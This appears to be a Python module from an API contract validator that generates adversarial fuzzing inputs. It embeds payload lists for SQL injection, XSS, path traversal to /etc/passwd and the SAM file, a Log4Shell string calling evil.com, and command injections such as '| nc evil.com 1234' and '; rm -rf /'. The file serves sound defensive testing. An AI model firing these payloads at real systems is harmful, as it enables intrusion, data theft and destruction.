"""
Mutation strategies for adversarial test case generation.

Provides various mutation techniques to generate unexpected inputs that
may reveal security vulnerabilities or edge cases.
"""

import random
import string
from typing import Any, Dict, List, Callable
from copy import deepcopy

from api_contract_validator.config.logging import get_logger

logger = get_logger(__name__)


class MutationEngine:
    """
    Applies adversarial mutations to test data to discover edge cases.
    """

    def __init__(self):
        self.mutation_strategies: List[Callable] = [
            self.unicode_injection,
            self.sql_injection_patterns,
            self.xss_patterns,
            self.overflow_patterns,
            self.type_confusion,
            self.nested_bomb,
            self.null_byte_injection,
            self.format_string_injection,
            self.path_traversal,
            self.command_injection,
        ]

    def apply_mutations(
        self, data: Dict[str, Any], mutation_count: int = None
    ) -> List[Dict[str, Any]]:
        """
        Apply multiple mutations to data and return mutated variants.

        Args:
            data: Original data dictionary
            mutation_count: Number of mutations to apply per variant (random if None)

        Returns:
            List of mutated data variants
        """
        if mutation_count is None:
            mutation_count = random.randint(1, 3)

        mutated_variants = []

        # Generate variants with different mutation combinations
        for _ in range(len(self.mutation_strategies)):
            variant = deepcopy(data)
            selected_mutations = random.sample(
                self.mutation_strategies, k=min(mutation_count, len(self.mutation_strategies))
            )

            for mutation_func in selected_mutations:
                variant = mutation_func(variant)

            mutated_variants.append(variant)

        return mutated_variants

    def unicode_injection(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Inject unicode characters, emojis, RTL characters, zero-width spaces.
        Tests encoding issues, display bugs, database storage problems.
        """
        unicode_payloads = [
            "Test\x00Data",  # Null character
            "Test​Data",  # Zero-width space
            "Test‮Data",  # Right-to-left override
            "🚀💥🔥Test",  # Emojis
            "TestData",  # Bell character
            "Ṫëṡẗ Ḋäṫä",  # Combining diacriticals
            "𝕿𝖊𝖘𝖙",  # Mathematical alphanumeric symbols
            "﻿" + "Test",  # Zero-width no-break space (BOM)
        ]

        mutated = deepcopy(data)

        for key, value in mutated.items():
            if isinstance(value, str):
                mutated[key] = random.choice(unicode_payloads)
                break  # Only mutate one field per variant

        return mutated

    def sql_injection_patterns(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Inject SQL injection payloads to test input sanitization.
        """
        sql_payloads = [
            "' OR '1'='1",
            "1' OR '1' = '1",
            "'; DROP TABLE users--",
            "admin'--",
            "' UNION SELECT NULL--",
            "1' AND 1=1--",
            "' OR 1=1--",
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' AND (SELECT COUNT(*) FROM users) > 0--",
        ]

        mutated = deepcopy(data)

        for key, value in mutated.items():
            if isinstance(value, str):
                mutated[key] = random.choice(sql_payloads)
                break

        return mutated

    def xss_patterns(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Inject XSS payloads to test output encoding.
        """
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg/onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
        ]

        mutated = deepcopy(data)

        for key, value in mutated.items():
            if isinstance(value, str):
                mutated[key] = random.choice(xss_payloads)
                break

        return mutated

    def overflow_patterns(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate buffer overflow attempts with extremely long strings.
        """
        overflow_sizes = [
            256,  # Common buffer size
            512,
            1024,
            4096,  # Page size
            65536,  # 64KB
            1048576,  # 1MB
        ]

        mutated = deepcopy(data)

        for key, value in mutated.items():
            if isinstance(value, str):
                size = random.choice(overflow_sizes)
                mutated[key] = "A" * size
                break
            elif isinstance(value, int):
                # Integer overflow
                mutated[key] = 2**31 - 1  # Max 32-bit signed int
                break

        return mutated

    def type_confusion(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Cause type confusion by sending unexpected types.
        """
        mutated = deepcopy(data)

        for key, value in mutated.items():
            if isinstance(value, str):
                # String to various types
                mutations = [
                    123,  # Integer
                    123.456,  # Float
                    True,  # Boolean
                    ["array"],  # Array
                    {"nested": "object"},  # Object
                    None,  # Null
                ]
                mutated[key] = random.choice(mutations)
                break
            elif isinstance(value, int):
                # Integer to string/special values
                mutations = [
                    "123",  # Numeric string
                    "NaN",
                    "Infinity",
                    "-Infinity",
                    str(value),
                ]
                mutated[key] = random.choice(mutations)
                break
            elif isinstance(value, bool):
                # Boolean confusion
                mutations = ["true", "false", "True", "False", 1, 0, "yes", "no"]
                mutated[key] = random.choice(mutations)
                break

        return mutated

    def nested_bomb(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Create deeply nested structures to test parser limits.
        """
        mutated = deepcopy(data)

        # Create deeply nested object
        depth = random.randint(50, 200)
        nested = {"value": "deep"}

        for _ in range(depth):
            nested = {"nested": nested}

        # Inject into first suitable field
        for key, value in mutated.items():
            if isinstance(value, dict):
                mutated[key] = nested
                break
            elif isinstance(value, str):
                # For string fields, create nested as new field
                mutated[key + "_nested"] = nested
                break

        return mutated

    def null_byte_injection(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Inject null bytes to test C-string handling.
        """
        null_payloads = [
            "test\x00.jpg",  # Null byte file extension bypass
            "test\x00admin",
            "\x00test",
            "test\x00",
        ]

        mutated = deepcopy(data)

        for key, value in mutated.items():
            if isinstance(value, str):
                mutated[key] = random.choice(null_payloads)
                break

        return mutated

    def format_string_injection(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Inject format string specifiers to test logging/formatting bugs.
        """
        format_payloads = [
            "%s%s%s%s%s",
            "%x%x%x%x%x",
            "%n%n%n%n%n",
            "{0}{1}{2}{3}",
            "${jndi:ldap://evil.com/a}",  # Log4Shell
            "{{7*7}}",  # Template injection
            "${7*7}",
        ]

        mutated = deepcopy(data)

        for key, value in mutated.items():
            if isinstance(value, str):
                mutated[key] = random.choice(format_payloads)
                break

        return mutated

    def path_traversal(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Inject path traversal patterns.
        """
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
        ]

        mutated = deepcopy(data)

        for key, value in mutated.items():
            if isinstance(value, str):
                mutated[key] = random.choice(traversal_payloads)
                break

        return mutated

    def command_injection(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Inject command injection patterns.
        """
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "`whoami`",
            "$(whoami)",
            "&& ping -c 5 evil.com",
            "; rm -rf /",
            "| nc evil.com 1234",
        ]

        mutated = deepcopy(data)

        for key, value in mutated.items():
            if isinstance(value, str):
                mutated[key] = "test" + random.choice(command_payloads)
                break

        return mutated

    def get_mutation_description(self, original: Dict, mutated: Dict) -> str:
        """
        Generate human-readable description of what was mutated.
        """
        for key in mutated:
            if key in original and original[key] != mutated[key]:
                mutation_type = self._identify_mutation_type(mutated[key])
                return f"Mutated field '{key}' with {mutation_type}"

        return "Applied complex mutation"

    def _identify_mutation_type(self, value: Any) -> str:
        """Identify the type of mutation applied."""
        if isinstance(value, str):
            if "<script>" in value or "<img" in value:
                return "XSS payload"
            elif "' OR" in value or "DROP TABLE" in value:
                return "SQL injection"
            elif "../" in value or "..\\" in value:
                return "path traversal"
            elif ";" in value or "|" in value or "`" in value:
                return "command injection"
            elif "\x00" in value:
                return "null byte injection"
            elif len(value) > 10000:
                return "buffer overflow"
            elif any(ord(c) > 127 for c in value):
                return "unicode injection"
            else:
                return "string mutation"
        elif isinstance(value, dict) and "nested" in value:
            return "nested bomb"
        elif type(value).__name__ != type(value).__name__:
            return "type confusion"
        else:
            return "unknown mutation"
